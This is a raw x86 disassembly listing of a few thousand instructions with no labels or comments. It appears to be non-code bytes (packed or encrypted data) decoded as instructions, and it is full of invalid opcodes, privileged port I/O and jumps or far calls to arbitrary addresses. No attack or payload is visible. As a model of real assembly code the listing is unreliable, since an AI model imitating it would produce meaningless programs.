  537916:	adc    ch,BYTE PTR [esi+0x6d81b7c8]
  53791c:	sbb    cl,BYTE PTR [eax+ebx*4+0x72]
  537920:	dec    esp
  537921:	test   BYTE PTR ds:0x321b0d4,dh
  537927:	retf   0xce24
  53792a:	call   0x2a48:0xf1eb5218
  537931:	cdq    
  537932:	out    0xbc,al
  537934:	call   0x6951:0x8823396e
  53793b:	into   
  53793c:	jns    0x5378d1
  53793e:	icebp  
  53793f:	lahf   
  537940:	inc    esp
  537941:	inc    ebp
  537942:	xor    eax,0xc1e5750a
  537947:	sub    ah,BYTE PTR [edx-0x75]
  53794a:	mov    eax,ds
  53794c:	imul   esp,DWORD PTR [ebx+0x42af20f5],0x68
  537953:	cmc    
  537954:	shl    BYTE PTR [ebx-0x6c],1
  537957:	sub    BYTE PTR [ecx-0x10],ah
  53795a:	fwait
  53795b:	add    eax,0x54423b99
  537960:	and    DWORD PTR [edx-0x3be599e1],ecx
  537966:	jg     0x537904
  537968:	jmp    0x537938
  53796a:	out    dx,al
  53796b:	push   0x39d85729
  537970:	stc    
  537971:	cmc    
  537972:	sub    al,0x4a
  537974:	dec    esi
  537975:	arpl   cx,bx
  537977:	fsubr  DWORD PTR [esi+0x2f]
  53797a:	mul    DWORD PTR [ebx+0x1b5fdd2e]
  537980:	jo     0x537941
  537982:	bound  esi,QWORD PTR [eax-0x1d68de7c]
  537988:	lds    edi,FWORD PTR [ecx]
  53798a:	leave  
  53798b:	fidivr WORD PTR [esi-0x306a6a2b]
  537991:	inc    edx
  537992:	cs dec edi
  537994:	pushf  
  537995:	(bad)  
  537996:	push   esi
  537997:	mov    dh,0xa1
  537999:	ficomp DWORD PTR [edi-0x5c7c80f3]
  53799f:	imul   ebx,DWORD PTR [ecx+0xc00d2ca],0x62
  5379a6:	dec    eax
  5379a7:	jecxz  0x53793d
  5379a9:	ss retf 
  5379ab:	xchg   ebp,eax
  5379ac:	stos   DWORD PTR es:[edi],eax
  5379ad:	idiv   DWORD PTR [ebx+edi*4-0x56]
  5379b1:	lahf   
  5379b2:	clc    
  5379b3:	push   esp
  5379b4:	in     eax,dx
  5379b5:	adc    DWORD PTR [eax+0x2e6724a0],edi
  5379bb:	stos   BYTE PTR es:[edi],al
  5379bc:	lahf   
  5379bd:	jle    0x537961
  5379bf:	into   
  5379c0:	test   eax,0x2a9ce4a6
  5379c5:	xchg   edi,eax
  5379c6:	jle    0x5379a3
  5379c8:	xchg   ecx,eax
  5379c9:	(bad)  
  5379cb:	popf   
  5379cc:	ror    BYTE PTR [ebp-0x60],0x34
  5379d0:	cmp    DWORD PTR [eax],0x6c
  5379d3:	(bad)  
  5379d4:	sbb    ch,BYTE PTR [ecx-0x698e32ad]
  5379da:	sbb    BYTE PTR [edx],bh
  5379dc:	add    BYTE PTR [eax-0x6e8541f9],cl
  5379e2:	aad    0x14
  5379e4:	int    0x6a
  5379e6:	call   0x3328:0x2404ac7d
  5379ed:	test   DWORD PTR [edx-0x6b7513de],0x37b1e8e
  5379f7:	icebp  
  5379f8:	jns    0x537a4c
  5379fa:	bound  esp,QWORD PTR [esi-0x6ad8384b]
  537a00:	xchg   esi,eax
  537a01:	mov    ds:0x27867ae4,al
  537a06:	fnstsw WORD PTR ds:0x93d9e9ab
  537a0c:	imul   BYTE PTR [eax-0x52]
  537a0f:	scas   eax,DWORD PTR es:[edi]
  537a10:	xchg   edi,eax
  537a11:	aad    0x1d
  537a13:	jle    0x537a70
  537a15:	sbb    DWORD PTR cs:[ecx+0x4c],0xffffff8b
  537a1a:	lea    edi,[edi-0xd9690d5]
  537a20:	mov    eax,ds:0x779d2eba
  537a25:	xchg   edx,eax
  537a26:	(bad)  
  537a27:	cmp    BYTE PTR [edi-0x331b584e],bl
  537a2d:	push   ss
  537a2e:	pushf  
  537a2f:	xor    BYTE PTR [ebp-0x35],bl
  537a32:	mov    esp,0xb9fd2205
  537a37:	push   edx
  537a38:	inc    edi
  537a39:	mov    eax,ds:0x70c55f01
  537a3e:	push   ss
  537a3f:	adc    BYTE PTR [edx+0x6d00303a],bh
  537a45:	dec    ebx
  537a46:	pop    edi
  537a47:	fmul   st(7),st
  537a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537a4a:	cmp    eax,0x9ff893ee
  537a4f:	adc    ah,BYTE PTR [ecx-0x2f]
  537a52:	jae    0x537a36
  537a54:	cmp    eax,0xa1c09ce1
  537a59:	push   es
  537a5a:	and    al,0xa4
  537a5c:	das    
  537a5d:	stos   BYTE PTR es:[edi],al
  537a5e:	out    dx,al
  537a5f:	fidiv  WORD PTR [esi-0x54]
  537a62:	jb     0x537aab
  537a64:	in     eax,0x3c
  537a66:	inc    ebp
  537a67:	pop    edi
  537a68:	jecxz  0x537a8b
  537a6a:	pusha  
  537a6b:	popa   
  537a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537a6d:	int3   
  537a6e:	repnz int3 
  537a70:	mov    dl,0x39
  537a72:	push   ecx
  537a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537a74:	xchg   ebp,eax
  537a75:	mov    al,cl
  537a77:	mov    ds:0x4c7a87ef,eax
  537a7c:	pop    esi
  537a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537a7e:	cli    
  537a7f:	js     0x537aae
  537a81:	push   ds
  537a82:	mov    ecx,0x208e5b3d
  537a87:	sar    ecx,0x66
  537a8a:	sahf   
  537a8b:	xchg   ecx,eax
  537a8c:	mov    ds:0x4de47959,al
  537a91:	add    DWORD PTR [esi+0x616f653e],esp
  537a97:	cmp    BYTE PTR [esi+edx*8],0xe8
  537a9b:	adc    BYTE PTR [edx+0x5691d5b4],dh
  537aa1:	aam    0xa9
  537aa3:	mov    ecx,0xf1a71025
  537aa8:	push   esi
  537aa9:	push   ebp
  537aaa:	shl    DWORD PTR [edi],0xaf
  537aad:	xchg   edi,eax
  537aae:	scas   eax,DWORD PTR es:[edi]
  537aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537ab0:	sub    dl,BYTE PTR [ebx+0x4d]
  537ab3:	mov    esi,0x11e1ba20
  537ab8:	mov    WORD PTR [edx],ss
  537aba:	loopne 0x537a62
  537abc:	inc    edi
  537abd:	cmp    eax,0x5d56b8c2
  537ac2:	enter  0x53f0,0x37
  537ac6:	(bad)  
  537ac7:	mov    esi,0x87d0b7f9
  537acc:	jg     0x537aea
  537ace:	add    bh,bl
  537ad0:	fist   WORD PTR [edi+0x68]
  537ad3:	rcl    DWORD PTR ds:[esi-0x6cf257d0],cl
  537ada:	cmp    ebx,DWORD PTR [ebp-0x17888781]
  537ae0:	jle    0x537abe
  537ae2:	retf   
  537ae3:	xor    al,bl
  537ae5:	push   ebx
  537ae6:	xchg   esp,eax
  537ae7:	cmp    DWORD PTR [eax-0x79],ebx
  537aea:	xchg   edx,eax
  537aeb:	fiadd  DWORD PTR [esi]
  537aed:	push   es
  537aee:	loope  0x537b1f
  537af0:	cwde   
  537af1:	fdivr  QWORD PTR [ecx+ebx*2]
  537af4:	pop    esp
  537af5:	fbld   TBYTE PTR [eax]
  537af7:	mov    eax,0x7ef797a
  537afc:	(bad)  
  537afd:	(bad)  
  537afe:	adc    al,0xa0
  537b00:	dec    ebx
  537b01:	inc    BYTE PTR [edx-0x6b81c0af]
  537b07:	mov    ch,0xff
  537b09:	dec    ebx
  537b0a:	push   es
  537b0b:	sar    edi,cl
  537b0d:	sbb    al,0xde
  537b0f:	inc    ebp
  537b10:	and    esp,DWORD PTR [ecx]
  537b12:	test   al,0xdb
  537b14:	scas   eax,DWORD PTR es:[edi]
  537b15:	sar    BYTE PTR es:[esi],1
  537b18:	sbb    BYTE PTR [edx+edi*1-0x80],cl
  537b1c:	test   BYTE PTR [edi+0x4e],0x7b
  537b20:	hlt    
  537b21:	fld    DWORD PTR [ebp-0xa]
  537b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537b25:	dec    ebp
  537b26:	mov    esp,0x6ccd75b5
  537b2b:	jge    0x537b57
  537b2d:	lds    eax,FWORD PTR [edx-0x68]
  537b30:	lods   al,BYTE PTR ds:[esi]
  537b31:	(bad)  
  537b33:	out    0x4e,al
  537b35:	add    bh,BYTE PTR [edx-0x6a]
  537b38:	cdq    
  537b39:	in     eax,dx
  537b3a:	sbb    eax,0x5a9dd413
  537b3f:	pop    DWORD PTR [esi-0x2f91871a]
  537b45:	retf   
  537b46:	xchg   esi,eax
  537b47:	inc    ebx
  537b48:	mov    eax,0x68b6f5ef
  537b4d:	test   eax,0xaac04bb6
  537b52:	ja     0x537aea
  537b54:	mov    DWORD PTR [ebx+0xd74b13b],0x58c7b601
  537b5e:	shr    BYTE PTR [edi-0xcd00c79],cl
  537b64:	and    al,0xec
  537b66:	or     dh,dh
  537b68:	sahf   
  537b69:	xlat   BYTE PTR ds:[ebx]
  537b6a:	scas   al,BYTE PTR es:[edi]
  537b6b:	add    esi,edx
  537b6d:	call   0x1f5c:0xd2f9bb52
  537b74:	loope  0x537bd4
  537b76:	mov    dl,0x3
  537b78:	loope  0x537be4
  537b7a:	out    0xa7,al
  537b7c:	sbb    al,0x62
  537b7e:	fisubr DWORD PTR [eax+0x45]
  537b81:	mov    ebx,0x24516c64
  537b86:	mov    edi,0xf547fc93
  537b8b:	inc    edx
  537b8c:	aaa    
  537b8d:	cmp    esi,0xaab8436b
  537b93:	add    DWORD PTR [edx-0x66],eax
  537b96:	frstor [esi-0x30]
  537b99:	pushf  
  537b9a:	out    dx,al
  537b9b:	jno    0x537bad
  537b9d:	lods   al,BYTE PTR ds:[esi]
  537b9e:	cmp    bh,ch
  537ba0:	les    esi,FWORD PTR [esi+0x3e]
  537ba3:	pop    ebp
  537ba4:	adc    al,BYTE PTR [eax+0x11]
  537ba7:	add    eax,0x27b4a87c
  537bac:	pop    ds
  537bad:	test   DWORD PTR [edi],ebx
  537baf:	bound  edx,QWORD PTR [edx+ebp*4+0x55c98e1f]
  537bb6:	push   ebx
  537bb7:	and    DWORD PTR [ebp+0x7b],ebp
  537bba:	add    eax,0x7d8745c2
  537bbf:	pop    ecx
  537bc0:	js     0x537ba5
  537bc2:	lods   eax,DWORD PTR ds:[esi]
  537bc3:	in     eax,0x31
  537bc5:	jg     0x537b9f
  537bc7:	ret    
  537bc8:	xchg   ecx,eax
  537bc9:	mov    ah,cl
  537bcb:	pusha  
  537bcc:	sahf   
  537bcd:	aaa    
  537bce:	xchg   DWORD PTR [edx-0x19c11f61],ecx
  537bd4:	mov    esi,0xee36d5b0
  537bd9:	jbe    0x537be6
  537bdb:	out    0x55,eax
  537bdd:	mov    esp,0x76eef6eb
  537be2:	dec    ecx
  537be3:	mov    ebp,0xcf2e700f
  537be8:	mov    edx,0xe0894e14
  537bed:	mov    bl,bh
  537bef:	int    0xb8
  537bf1:	fs in  eax,dx
  537bf3:	imul   BYTE PTR [ecx]
  537bf5:	mov    bl,0x46
  537bf7:	bound  ebx,QWORD PTR [edx+0xaee3b92]
  537bfd:	mov    WORD PTR [eax],cs
  537bff:	and    al,0xe9
  537c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537c02:	inc    edi
  537c03:	sar    DWORD PTR [edx-0x3423ea3],0xc6
  537c0a:	push   ds
  537c0b:	das    
  537c0c:	aam    0x5
  537c0e:	sub    BYTE PTR [esi+0x935aa9f],dl
  537c14:	pop    edi
  537c15:	jbe    0x537c7c
  537c17:	jmp    0xfaa8ee9f
  537c1c:	add    BYTE PTR [edx-0x4a],ah
  537c1f:	pop    ebp
  537c20:	add    eax,0x6ff2b344
  537c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  537c26:	sub    eax,eax
  537c28:	stos   DWORD PTR es:[edi],eax
  537c29:	xlat   BYTE PTR ds:[ebx]
  537c2a:	mov    ds:0xf63fe988,al
  537c2f:	js     0x537c51
  537c31:	mov    ?,WORD PTR [ebx+0x67]
  537c34:	mov    ch,0x1e
  537c36:	pop    ss
  537c37:	mov    BYTE PTR [ebp+0x13c056ed],bl
  537c3d:	and    eax,0x3a31a2a2
  537c42:	xchg   edx,eax
  537c43:	test   DWORD PTR ds:0x8cbe21d,eax
  537c49:	test   BYTE PTR [edi],dl
  537c4b:	call   0xce2:0x9153274f
  537c52:	adc    al,0x90
  537c54:	inc    ebp
  537c55:	push   eax
  537c56:	mov    ah,0xbf
  537c58:	mov    bh,0xc5
  537c5a:	enter  0x12e9,0x19
  537c5e:	push   esi
  537c5f:	das    
  537c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537c61:	popa   
  537c62:	dec    esi
  537c63:	enter  0x6e59,0xe1
  537c67:	sub    ebx,DWORD PTR [edx+0x39c2b4e0]
  537c6d:	xor    DWORD PTR [eax+0x29],esp
  537c70:	out    dx,al
  537c71:	mov    gs,edi
  537c73:	lock mov ecx,0x9c0d5d5a
  537c79:	std    
  537c7a:	push   edi
  537c7b:	(bad)  
  537c7c:	outs   dx,DWORD PTR ds:[esi]
  537c7d:	xchg   esi,eax
  537c7e:	es sub DWORD PTR es:[edx+0x3c6ec39],ebx
  537c86:	lahf   
  537c87:	or     eax,0x27c867cf
  537c8c:	push   esp
  537c8d:	call   0xe15b868a
  537c92:	ins    BYTE PTR es:[edi],dx
  537c93:	aam    0x1d
  537c95:	push   edi
  537c96:	or     DWORD PTR [ecx+0x4f],eax
  537c99:	pop    edi
  537c9a:	outs   dx,DWORD PTR ds:[esi]
  537c9b:	cmp    DWORD PTR [ecx],edx
  537c9d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  537c9f:	xchg   ebx,eax
  537ca0:	adc    dh,BYTE PTR [eax-0x3c]
  537ca3:	add    al,0xdf
  537ca5:	test   dh,ah
  537ca7:	cli    
  537ca8:	int    0xb
  537caa:	jmp    0x537cc2
  537cac:	loopne 0x537c88
  537cae:	sub    al,0x55
  537cb0:	mov    dl,0x9d
  537cb2:	jne    0x537c47
  537cb4:	inc    esp
  537cb5:	into   
  537cb6:	fxch   st(6)
  537cb8:	mov    DWORD PTR [ecx+0x63bf45],0x6f9c0506
  537cc2:	call   0xd5e2:0x70f6f9ae
  537cc9:	out    dx,eax
  537cca:	retf   
  537ccb:	fdiv   DWORD PTR [ecx+esi*4+0x72dcda11]
  537cd2:	mov    esp,0xc2809392
  537cd7:	mov    edx,0x8a85f9cd
  537cdc:	bound  edx,QWORD PTR [eax+edi*8-0x73127d3f]
  537ce3:	push   edx
  537ce4:	add    eax,DWORD PTR [esi-0x22]
  537ce7:	cmp    ch,BYTE PTR [eax-0x1685fc6f]
  537ced:	push   edx
  537cee:	add    eax,0x42e14f69
  537cf3:	xlat   BYTE PTR ds:[ebx]
  537cf4:	mov    ecx,DWORD PTR [ecx]
  537cf6:	adc    al,0x8a
  537cf8:	neg    BYTE PTR [edx+0x2675105]
  537cfe:	popa   
  537cff:	push   0x4c
  537d01:	xor    ecx,DWORD PTR [edx-0x7d]
  537d04:	push   es
  537d05:	pusha  
  537d06:	repz lock stc 
  537d09:	fmul   QWORD PTR [edx-0x6b461db1]
  537d0f:	mov    cl,0x34
  537d11:	jg     0x537d27
  537d13:	das    
  537d14:	jne    0x537cd7
  537d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537d17:	jns    0x537d39
  537d19:	add    edx,DWORD PTR [ebp-0x7f]
  537d1c:	rol    DWORD PTR [edi-0x661cb69d],0xc1
  537d23:	pop    edx
  537d24:	pop    eax
  537d25:	mov    al,0x11
  537d27:	adc    eax,ebp
  537d29:	cmc    
  537d2a:	xor    eax,0xb144568
  537d2f:	test   BYTE PTR [esi-0x23429d63],0xb1
  537d36:	(bad)  
  537d37:	push   0x4c
  537d39:	data16 (bad) 
  537d3b:	sbb    bl,ah
  537d3d:	aaa    
  537d3e:	mov    DWORD PTR [eax],edi
  537d40:	or     eax,0x884806cd
  537d45:	test   DWORD PTR [eax+0x4104674b],eax
  537d4b:	jg     0x537d3b
  537d4d:	lea    ebx,[edx+0x65]
  537d50:	nop
  537d51:	and    BYTE PTR [esp+ebp*4+0x49898a36],dh
  537d58:	mov    ds:0x6d332742,eax
  537d5d:	cmp    ebx,0xeca7c552
  537d63:	ss mov dl,0x47
  537d66:	mov    ebx,0x96a970e3
  537d6b:	in     eax,0xa2
  537d6d:	pushf  
  537d6e:	adc    al,0x44
  537d70:	fldenv ds:0xa7b83ae3
  537d76:	xlat   BYTE PTR ds:[ebx]
  537d77:	fmul   DWORD PTR [edi+0x4]
  537d7a:	mov    cl,0x9
  537d7c:	dec    ebx
  537d7d:	add    DWORD PTR [eax],ebp
  537d7f:	pop    edx
  537d80:	dec    edi
  537d81:	inc    esi
  537d82:	dec    edx
  537d83:	stc    
  537d84:	xlat   BYTE PTR ds:[ebx]
  537d85:	xchg   BYTE PTR [ebx-0x7c463c79],dl
  537d8b:	jae    0x537d15
  537d8d:	pop    edx
  537d8e:	mov    fs,WORD PTR [eax]
  537d90:	ret    
  537d91:	fisttp DWORD PTR [esi]
  537d93:	push   ebx
  537d94:	loopne 0x537d5f
  537d96:	ja     0x537d4d
  537d98:	pop    edi
  537d99:	sti    
  537d9a:	mov    edi,DWORD PTR ds:0x796a8811
  537da0:	(bad)
  537da3:	fst    DWORD PTR [ecx-0x36]
  537da6:	inc    ebx
  537da7:	or     BYTE PTR [ecx+0x1c],dh
  537daa:	mov    dh,0xa8
  537dac:	sbb    al,0xa4
  537dae:	sti    
  537daf:	addr16 mov ebp,0x820a9b8a
  537db5:	iret   
  537db6:	and    esi,DWORD PTR [edi-0x35]
  537db9:	rcr    BYTE PTR [edx+0x6d],1
  537dbc:	jecxz  0x537d68
  537dbe:	jmp    0xc62c8167
  537dc3:	cli    
  537dc4:	call   0x44781ef4
  537dc9:	pop    ecx
  537dca:	aas    
  537dcb:	and    dh,bl
  537dcd:	jmp    0x6d0becc0
  537dd2:	bound  ebx,QWORD PTR [ecx+0x47]
  537dd5:	push   eax
  537dd6:	push   cs
  537dd7:	push   ebx
  537dd8:	dec    edx
  537dd9:	retf   
  537dda:	push   cs
  537ddb:	pusha  
  537ddc:	shr    al,0x1c
  537ddf:	out    dx,eax
  537de0:	push   esi
  537de1:	dec    esi
  537de2:	dec    edi
  537de3:	faddp  st(2),st
  537de5:	sar    BYTE PTR [edi-0x26],1
  537de8:	and    BYTE PTR [edi-0x1e],ch
  537deb:	add    al,0x43
  537ded:	int3   
  537dee:	ss dec edi
  537df0:	fs sbb cl,cl
  537df3:	rcl    DWORD PTR [esi-0xea4dda9],0xe7
  537dfa:	dec    edx
  537dfb:	mov    bh,0x20
  537dfd:	rol    BYTE PTR [edx],cl
  537dff:	cmp    eax,0xd9f84799
  537e04:	hlt    
  537e05:	ja     0x537e1a
  537e07:	aaa    
  537e08:	stos   BYTE PTR es:[edi],al
  537e09:	dec    eax
  537e0a:	mov    ebp,0xb68d3e97
  537e0f:	imul   esp,esp,0x78818e27
  537e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  537e16:	xchg   edx,eax
  537e17:	test   eax,0x82f81c55
  537e1c:	retf   
  537e1d:	jle    0x537dfb
  537e1f:	pop    ebx
  537e20:	(bad)  [edx+0x4bb15a2]
  537e26:	dec    esi
  537e27:	xor    BYTE PTR [ecx-0x70bf7490],ah
  537e2d:	fs mov cl,0x34
  537e30:	(bad)  
  537e32:	mov    ah,dh
  537e34:	dec    ebp
  537e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  537e36:	jno    0x537e9c
  537e38:	pop    es
  537e39:	sub    al,0xa8
  537e3b:	inc    esi
  537e3c:	std    
  537e3d:	cmp    BYTE PTR [ebx+0x54],cl
  537e40:	clc    
  537e41:	outs   dx,DWORD PTR ds:[esi]
  537e42:	jmp    0x537e67
  537e44:	in     al,dx
  537e45:	(bad)  [ebp-0x5a830600]
  537e4b:	push   esp
  537e4c:	out    dx,eax
  537e4d:	sbb    eax,0x18fd11fd
  537e52:	test   BYTE PTR [ebp+0x14d35ffd],0x4a
  537e59:	sub    eax,0xed4b4fef
  537e5e:	sbb    bh,ah
  537e60:	scas   eax,DWORD PTR es:[edi]
  537e61:	sub    DWORD PTR [eax],esi
  537e63:	jmp    0x1e1bd5f2
  537e68:	aas    
  537e69:	test   eax,0xf4a9e7fb
  537e6e:	jo     0x537ee2
  537e70:	popa   
  537e71:	(bad)  
  537e72:	ficom  WORD PTR [eax-0x35]
  537e75:	mov    ds:0x7e5564d1,al
  537e7a:	sbb    DWORD PTR [ecx-0x1a7b762a],0xffffffc3
  537e81:	mov    edi,0xdf34acd5
  537e86:	loop   0x537e3b
  537e88:	mov    dl,0xb
  537e8a:	mov    ah,0x41
  537e8c:	sbb    bh,BYTE PTR [eax]
  537e8e:	leave  
  537e8f:	sbb    bl,cl
  537e91:	retf   
  537e92:	cmp    eax,0x1f66b709
  537e97:	xor    al,0x1
  537e99:	ss (bad) 
  537e9b:	mov    al,ds:0xd2d27109
  537ea0:	and    esp,DWORD PTR [ebx+0x4a464e09]
  537ea6:	and    eax,0xf18e4ef6
  537eab:	xchg   edx,edx
  537ead:	leave  
  537eae:	and    BYTE PTR [ebx],dh
  537eb0:	or     ah,dl
  537eb2:	adc    BYTE PTR [edx+0x50],0xcc
  537eb6:	sbb    edi,DWORD PTR ds:0x80840bd6
  537ebc:	ror    bl,0xa2
  537ebf:	mov    ch,0x28
  537ec1:	jge    0x537efc
  537ec3:	sbb    dh,ah
  537ec5:	sub    esp,DWORD PTR [edi-0x56]
  537ec8:	sti    
  537ec9:	out    0x41,eax
  537ecb:	fcmove st,st(2)
  537ecd:	cli    
  537ece:	mov    ebp,edi
  537ed0:	jg     0x537f2c
  537ed2:	fimul  DWORD PTR [eax]
  537ed4:	jmp    0xa2f9ce73
  537ed9:	mov    BYTE PTR [ecx],al
  537edb:	dec    esp
  537edc:	mov    dh,0x7c
  537ede:	inc    eax
  537edf:	cmp    al,0xa9
  537ee1:	add    al,BYTE PTR [edx-0x64de76dc]
  537ee7:	jecxz  0x537eb8
  537ee9:	aam    0x2b
  537eeb:	das    
  537eec:	xor    bl,BYTE PTR [eax+0x39cf9478]
  537ef2:	xor    al,ch
  537ef4:	mov    edi,DWORD PTR [ecx-0x1e]
  537ef7:	lea    edx,[edx-0xd2ebe96]
  537efd:	sbb    DWORD PTR [ebp+0x78effcca],edi
  537f03:	shl    dh,1
  537f05:	daa    
  537f06:	mov    ebp,DWORD PTR [edx+0x19]
  537f09:	adc    bl,BYTE PTR [esi]
  537f0b:	mov    bh,BYTE PTR [ecx+ebx*2+0x5a]
  537f0f:	jmp    0x537f33
  537f11:	adc    al,0xc9
  537f13:	shl    BYTE PTR [esi-0x385e8cde],cl
  537f19:	lods   eax,DWORD PTR ds:[esi]
  537f1a:	xor    ecx,ebx
  537f1c:	das    
  537f1d:	inc    esi
  537f1e:	cmp    esi,edx
  537f20:	sbb    esi,DWORD PTR [esi-0x3fdace66]
  537f26:	or     al,0x1b
  537f28:	sbb    bl,BYTE PTR [edx+0x7d]
  537f2b:	dec    esp
  537f2c:	loopne 0x537f33
  537f2e:	fldcw  WORD PTR [ecx+0x79]
  537f31:	int3   
  537f32:	dec    ebp
  537f33:	ret    
  537f34:	cdq    
  537f35:	test   DWORD PTR [ebx],esp
  537f37:	push   0x26344ee4
  537f3c:	pop    ebx
  537f3d:	mov    cl,0x9a
  537f3f:	mov    bh,0xb7
  537f41:	cmp    ecx,esi
  537f43:	pop    ebx
  537f44:	jmp    0x537f81
  537f46:	sbb    DWORD PTR [ebp-0x50],ebp
  537f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  537f4a:	mov    dh,0x6e
  537f4c:	aaa    
  537f4d:	jne    0x537efb
  537f4f:	clc    
  537f50:	xchg   ebx,eax
  537f51:	pop    ss
  537f52:	xchg   edi,eax
  537f53:	aad    0xef
  537f55:	mov    bh,0xb8
  537f57:	dec    esi
  537f58:	push   esi
  537f59:	xchg   edx,eax
  537f5a:	push   es
  537f5b:	mov    al,0x9d
  537f5d:	mov    ds:0xc58a7508,eax
  537f62:	inc    eax
  537f63:	sub    BYTE PTR [esi-0x58],dl
  537f66:	sub    eax,0xc6a05b8b
  537f6b:	repz sub ax,0x91c4
  537f70:	cmp    eax,esi
  537f72:	cld    
  537f73:	jb     0x537f5b
  537f75:	mov    WORD PTR [esp+edx*8],ss
  537f78:	into   
  537f79:	jmp    0x537fbc
  537f7b:	rcl    bh,0xb4
  537f7e:	daa    
  537f7f:	or     eax,0x9c94a54b
  537f84:	dec    edx
  537f85:	bound  esp,QWORD PTR [edi]
  537f87:	mov    al,ds:0xf3abede9
  537f8c:	les    eax,FWORD PTR [ebp-0x25]
  537f8f:	loopne 0x537f46
  537f91:	sbb    BYTE PTR [ebx+eiz*1],bl
  537f94:	cmp    bl,BYTE PTR [ecx-0x33]
  537f97:	mov    BYTE PTR [ebp+0x3b],ch
  537f9a:	cmp    DWORD PTR [edx-0x2a],eax
  537f9d:	pushf  
  537f9e:	xchg   esi,eax
  537f9f:	add    al,0x58
  537fa1:	xchg   ebx,eax
  537fa2:	inc    ebp
  537fa3:	jecxz  0x537f53
  537fa5:	sahf   
  537fa6:	mov    esp,0x1b32288c
  537fab:	or     al,0xac
  537fad:	jp     0x537f99
  537faf:	xchg   ecx,eax
  537fb0:	fist   WORD PTR [esi+ebx*4+0xd]
  537fb4:	aam    0x57
  537fb6:	sub    al,0x5f
  537fb8:	rcl    DWORD PTR [ebp-0x761b232b],1
  537fbe:	or     eax,0x6954601
  537fc3:	mov    es,ebp
  537fc5:	mov    ebp,0x251a8bc6
  537fca:	and    DWORD PTR [ebx-0x54],edi
  537fcd:	pop    ebp
  537fce:	cmc    
  537fcf:	in     al,0xef
  537fd1:	mov    ds:0x8d850a95,eax
  537fd6:	inc    ebp
  537fd7:	loope  0x538011
  537fd9:	pop    bx
  537fdb:	mov    edi,0x10d9353a
  537fe0:	ins    BYTE PTR es:[edi],dx
  537fe1:	sbb    esi,esp
  537fe3:	in     eax,0x5a
  537fe5:	pop    esp
  537fe6:	push   esi
  537fe7:	xchg   esp,eax
  537fe8:	push   esp
  537fe9:	(bad)  
  537feb:	pop    edi
  537fec:	xor    al,0x2c
  537fee:	add    ecx,ebx
  537ff0:	loop   0x53800c
  537ff2:	aas    
  537ff3:	repnz pushw 0xfff5
  537ff7:	icebp  
  537ff8:	out    0x1,al
  537ffa:	sub    bl,al
  537ffc:	(bad)  
  537ffd:	jo     0x53806d
  537fff:	xchg   ecx,eax
  538000:	jne    0x537ffe
  538002:	enter  0x30f4,0xbe
  538006:	int3   
  538007:	push   esp
  538008:	test   ebp,ebx
  53800a:	sub    BYTE PTR [ebx-0xc888193],0x80
  538011:	dec    ebx
  538012:	jae    0x53807c
  538014:	popa   
  538015:	dec    edx
  538016:	scas   eax,DWORD PTR es:[edi]
  538017:	push   esp
  538018:	retf   
  538019:	aaa    
  53801a:	mov    edx,0xcab88fc7
  53801f:	or     DWORD PTR [ebx-0x6d11899e],eax
  538025:	push   ebx
  538026:	sbb    BYTE PTR [esi+0x132f775],bl
  53802c:	(bad)  
  53802d:	fcomip st,st(1)
  53802f:	push   ss
  538030:	dec    ebx
  538031:	fsub   QWORD PTR [ecx+0x1f]
  538034:	inc    ecx
  538035:	xor    BYTE PTR [ebp+0x78e3031c],0xfd
  53803c:	outs   dx,DWORD PTR ds:[esi]
  53803d:	push   DWORD PTR ds:0x57505772
  538043:	and    dl,BYTE PTR [esi-0x29]
  538046:	jp     0x5380c6
  538048:	into   
  538049:	ds sub cl,ch
  53804c:	enter  0xfaa3,0xe4
  538050:	push   cs
  538051:	scas   al,BYTE PTR es:[edi]
  538052:	dec    eax
  538053:	pusha  
  538054:	push   ecx
  538055:	in     al,0xc2
  538057:	adc    BYTE PTR [edx-0x4c],cl
  53805a:	dec    edx
  53805b:	pop    esi
  53805c:	aad    0x13
  53805e:	jae    0x5380df
  538060:	les    ebx,FWORD PTR [esp+ebp*1]
  538063:	cwde   
  538064:	ja     0x538025
  538066:	mov    ?,WORD PTR [ebp+0x2c]
  538069:	dec    esi
  53806a:	jmp    0xee30493d
  53806f:	fistp  QWORD PTR [ebx-0x5f4ea92b]
  538075:	rcl    bh,0x31
  538078:	imul   DWORD PTR [edx+0x4]
  53807b:	pop    ss
  53807c:	add    ecx,DWORD PTR [ecx-0x7d61a5aa]
  538082:	pop    es
  538083:	(bad)  
  538084:	mov    dl,0x9d
  538086:	loopne 0x538102
  538088:	mov    bl,0xec
  53808a:	test   DWORD PTR [ebx-0x9151ec8],eax
  538090:	push   esp
  538091:	cmp    DWORD PTR [ebx-0x3f],ebp
  538094:	push   ss
  538095:	xchg   edi,eax
  538096:	xchg   DWORD PTR [edi],edi
  538098:	test   dl,ch
  53809a:	mov    eax,esi
  53809c:	ins    DWORD PTR es:[edi],dx
  53809d:	in     al,0x9
  53809f:	popa   
  5380a0:	push   0x24
  5380a2:	mov    cl,0x21
  5380a4:	adc    al,0x45
  5380a6:	ins    DWORD PTR es:[edi],dx
  5380a7:	ss clc 
  5380a9:	mov    ebp,0x944783c8
  5380ae:	mov    ebx,0x60bb60e1
  5380b3:	scas   eax,DWORD PTR es:[edi]
  5380b4:	mov    es,WORD PTR [ebx+0x13b3bda1]
  5380ba:	mov    esi,?
  5380bc:	cwde   
  5380bd:	dec    ecx
  5380be:	mov    ds:0xb2077a8f,al
  5380c3:	cmc    
  5380c4:	test   eax,0x73ea8804
  5380c9:	scas   al,BYTE PTR es:[edi]
  5380ca:	(bad)  
  5380cb:	jmp    FWORD PTR [ecx-0x44]
  5380ce:	shr    DWORD PTR [esi-0x8],0x9c
  5380d2:	loope  0x53810f
